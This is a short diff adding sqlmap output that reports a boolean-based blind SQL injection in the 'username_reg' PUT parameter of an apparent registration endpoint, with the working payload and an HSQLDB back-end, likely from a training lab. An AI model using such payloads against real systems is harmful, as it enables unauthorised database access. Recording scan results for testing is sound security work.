@@ -1,0 +1,8 @@
+sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
+---
+Parameter: username_reg (PUT)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username_reg=tom' AND 6734=6734-- YLeH&email_reg=a@b&password_reg=123&confirm_password_reg=123
+---
+back-end DBMS: HSQLDB >= 2.0.0 and < 2.3.0
